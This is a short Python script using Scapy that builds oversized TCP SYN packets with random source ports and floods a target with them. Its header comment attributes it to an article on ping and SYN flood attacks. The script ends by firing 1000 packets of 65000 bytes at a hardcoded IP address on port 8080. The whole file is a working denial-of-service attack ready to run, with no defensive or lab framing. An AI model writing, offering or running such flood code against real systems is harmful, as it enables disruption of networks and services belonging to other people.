# This script is entirely from https://systemweakness.com/ping-and-syn-flood-attacks-with-python-and-scapy-6e4515435492

from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort


def send_syn(target_ip_address: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
    ip = IP(dst=target_ip_address)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * size_of_packet)
    p = ip / tcp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(
        size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))


send_syn('131.229.238.255', 8080, 1000, 65000)
